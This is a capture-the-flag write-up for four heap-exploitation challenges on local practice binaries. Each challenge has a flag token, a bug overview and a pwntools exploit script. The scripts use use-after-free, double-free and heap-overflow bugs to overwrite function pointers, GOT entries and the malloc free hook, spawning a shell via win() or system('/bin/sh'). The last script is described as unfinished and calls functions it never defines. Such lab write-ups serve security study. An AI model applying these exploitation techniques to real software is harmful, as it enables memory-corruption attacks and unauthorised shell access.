useme
==========================================================
Flag:
----------------------------------------------------------
    FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNy11c2VtZWRvbnRhYnVzZW1lIiwiaXAiOiIxMDEuMTY0LjMzLjIxOSIsInNlc3Npb24iOiIwZmZkMTIzNi02NGZjLTQyYzYtOTkxZS05ZDUwZTI0ZDM0OTMifQ.Rk7Klo-3-6u9KVs8TLXLci8lAT-azWcYfmozt61XJho}

General overview:
----------------------------------------------------------
1. Use-after free allows for arbitrary memory writes. If you change where the next pointer in a free block is you can change where malloc() will allocate.
2. By writing to an incorrect location you're able to overwrite the pointer to the hint() function in one of the clones to point to win().
3. When invoking the hint it will instead pop the shell.

Script used:
----------------------------------------------------------

```python
#!/usr/bin/env python2

from pwn import *

global p

def create(id, name):
    p.sendlineafter("Choice:", "A")
    p.sendlineafter("ID:", id)
    p.sendlineafter("8):", name)

def destroy(id):
    p.sendlineafter("Choice:", "B")
    p.sendlineafter("ID:", id)

def name(id, name):
    p.sendlineafter("Choice:", "C")
    p.sendlineafter("ID:", id)
    p.sendlineafter("8):", name)

def view(id):
    p.sendlineafter("Choice:", "D")
    p.sendlineafter("ID:", id)
    p.recvuntil("Name: ")
    return u32(p.recvline()[:4])

def hint(id):
    p.sendlineafter("Choice:", "H")
    p.sendlineafter("ID:", id)

p = process("./useme")
elf = p.elf

create("0", "0")
create("1", "1")

destroy("0")
destroy("1")

# Leak the heap address (the back pointer from 1 to 0)
heap = view("1")
name("0", p32(heap + 0x8))

create("2", "3")
create("3", "4")
create("4", b"Gd\x00\x00" + p32(elf.symbols["win"]))

hint("3")

p.interactive()
p.close()
```


ezpz1
==========================================================
Flag:
----------------------------------------------------------
    FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNy1lenB6MSIsImlwIjoiMTAxLjE2NC4zMy4yMTkiLCJzZXNzaW9uIjoiZDQ0MTk3NTAtZjRhMi00MzRkLTgzY2YtNzk5ZGMyMWJmOGJlIn0.VLWA8CPJlCywtgQtp670XopDsi-XDA9IXnGamf7nZQE}

General overview:
----------------------------------------------------------
1. The functions don't check whether a question has been freed yet, so you can have two questions pointing to the same memory location.
2. By writing to the location after it has been freed, you can overwrite the question pointer to point to win()

Script used:
----------------------------------------------------------

```python
#!/usr/bin/env python2

from pwn import *

global p

def create():
    p.sendlineafter("):", "C")

def destroy(id):
    p.sendlineafter("):", "D")
    p.sendlineafter("id:", str(id))

# Overwriting set() :)
def set(id, question):
    p.sendlineafter("):", "S")
    p.sendlineafter("id:", str(id))
    p.sendlineafter("question:", question)

def ask(id):
    p.sendlineafter("):", "A")
    p.sendlineafter("id:", str(id))

p = process("./ezpz1")
elf = p.elf

# Create a question and delete it
create()
destroy(0)

# Create another question, it will have the same location as the previous question
# So the "question" will overwrite the address for print_question()
create()
set(1, p32(elf.symbols["win"]))
ask(0)

p.interactive()
p.close()
```


ezpz2
==========================================================
General overview:
----------------------------------------------------------
1. Could write into heap using buffer overflow in set_question() function
2. Leaked the address for puts() in libc by writing it's GOT address into heap buffer and using ask_question() to derefence it.
3. Used the puts() address to find the libc base. Used libc base to find system()
4. Used the print_banner() function (which behaved very similarly to win() from ezpz1) to pop a shell
    * Replaced puts() in GOT with system() from libc
    * Wrote "/bin/sh\x00" to the banner buffer
    * Replaced exit() in GOT with print_banner()
5. After replacing these functions, I just had to invoke exit() (I chose exit() as it wasn't called normally, so I wouldn't have a confusing flow of execution.)

Flag:
----------------------------------------------------------
    FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNy1lenB6MiIsImlwIjoiMTAxLjE2NC4zMy4yMTkiLCJzZXNzaW9uIjoiYzcwY2Q2ODAtMDEyZi00ZmZiLTliYmItYWNmZmNhMTljZGQyIn0.cuU8HM08HtQrLuJ2zeT69zz9F9nXrzz8vBXOj23qhoY}

Script used:
----------------------------------------------------------

```python
#!/usr/bin/env python2.7

from pwn import *

def create():
    p.sendlineafter("):", "C")

def destroy(id):
    p.sendlineafter("):", "D")
    p.sendlineafter("id:", str(id))

def set(id, question):
    p.sendlineafter("):", "S")
    p.sendlineafter("id:", str(id))
    p.sendlineafter("question:", question)

def ask(id):
    p.sendlineafter("):", "A")
    p.sendlineafter("id:", str(id))
    p.recvuntil("'")
    return p.recvuntil("'", drop=True)

# Writes a string to the supplied memory address
def write_memory(src, dest):
    set_memory(src)
    set(1, dest)

# Reads memory at the supplied address
def read_memory(src):
    set_memory(src)
    return u32(ask("1")[:4])

# Sets the question pointer of Q1 to be the supplied memory address
def set_memory(src):
    payload = p32(0x0) * 0x7
    payload += p32(0x00000021)
    payload += p32(heap_addr)
    payload += p32(0x0) * 0x5
    payload += p32(src)
    payload += p32(0x00000021)
    set(0, payload)

p = process("./ezpz2")
elf = p.elf

create()
create()
destroy(0)
destroy(1)

heap_addr = u32(ask(1)[:4])
libc_base = read_memory(elf.got["puts"]) - 0x067c10

# The general idea is to cause the call of puts(banner) in the print_banner() function to be overwritten such that it will invoke system('bin/sh'), then to overwrite the _exit() function to print_banner().
# This will cause a call to _exit() to instead pop a shell
write_memory(elf.got["_exit"],      p32(elf.symbols["print_banner"]))
write_memory(elf.symbols["banner"], b"/bin/sh\x00")
write_memory(elf.got["puts"],       p32(libc_base + 0x03d250))

# An invalid command that will invoke _exit()
destroy(44)

p.interactive()
p.close()
```


notezpz
==========================================================
General overview:
----------------------------------------------------------
1. I wasn't able to finish this in time, but I believe that it would follow a similar method to the previous one.
2. I found how to leak the <main_arena> libc function through changing the size of a buffer before it was freed, and then filling up the tcache. From here the backwards pointer pointed to <main_arena+56>.
3. I leaked the backwards pointer by first leaking the address of one of the freed nodes with a use-after free (ask would write the location of the next pointer in a free node)
4. After this I found the offsets of "/bin/sh\x00" and system() from the libc database. So I needed to store these in the buffer used for invoking ask_question()
5. Finally I needed to write these functions into the correct place in the heap buffer, and invoke ask_question(), however I ran out of time.

Flag:
----------------------------------------------------------
    FLAG{}

Script used:
----------------------------------------------------------

```python
#!/usr/bin/env python2.7

from pwn import *

def create():
    p.sendlineafter("):", "C")

def destroy(id):
    p.sendlineafter("):", "D")
    p.sendlineafter("id:", str(id))

def set(id, question):
    p.sendlineafter("):", "S")
    p.sendlineafter("id:", str(id))
    p.sendlineafter("question:", question)

def ask(id):
    p.sendlineafter("):", "A")
    p.sendlineafter("id:", str(id))
    p.recvuntil("'")
    return p.recvuntil("'", drop=True)

# Writes a string to the supplied memory address
def write_memory(src, dest):
    set_memory(src)
    set(1, dest)

# Reads memory at the supplied address
def read_memory(src):
    set_memory(src)
    return u32(ask(1)[:4])

# Sets the question pointer of questions[1] to be the supplied memory address
def set_memory(memory_to_leak, next_pointer=0x0):
    if (next_pointer == 0x0):
        next_pointer = elf.symbols["print_question"]

    payload = p32(0x0) * 0x7
    payload += p32(0x00000021)
    payload += p32(next_pointer)
    payload += p32(0x0) * 0x5
    payload += p32(memory_to_leak)
    payload += p32(0x00000021)
    set(0, payload)

start()

# Double free 1, so when allocating 2 you will store the back pointer to 1 in a chunk
create()
create()
destroy(1)
create()
destroy(1)
create()

heap_addr = u32(ask(2)[:4])

# Sets back pointer of 1 to itself, so when allocating a question, you allocate the same chunk twice
set_memory(0x0, heap_addr)
create()
elf.address = u32(ask(3)[:4]) - elf.symbols["print_question"]

# Fix up the question pointer to correctly point at the question
set_memory(heap_addr + 0x20)

if args.REMOTE:
    libc_base = read_memory(elf.got["puts"]) - 0x67b40
    system    = libc_base + 0x03d200
    free_hook = libc_base + 0x1d98d0
else:
    libc_base = read_memory(elf.got["puts"])- 0x67c10
    system    = libc_base + 0x3d250
    free_hook = libc_base + 0x1d98d0

# Overwrite the malloc free hook with a pointer to system(), so when the program attempts to free the question, instead call system() on the question
write_memory(free_hook, p32(system))
# Overwrite the question with a pointer to bin/sh, so instead of calling system() on the question, it calls system('bin/sh')
set(0, "/bin/sh\x00")

delete(0)

p.interactive()
p.close()
```